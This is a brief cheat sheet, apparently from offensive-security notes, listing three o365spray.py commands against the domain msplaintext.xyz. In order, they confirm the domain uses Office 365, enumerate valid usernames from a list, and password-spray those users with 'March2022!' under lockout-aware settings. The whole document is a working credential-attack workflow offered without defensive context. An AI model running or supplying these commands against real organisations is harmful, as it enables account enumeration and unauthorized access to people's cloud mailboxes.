


Validates if target domain is using office 365

```
python3 o365spray.py --validate --domain msplaintext.xyz

```

Identifies users
```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

Password spraying
```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

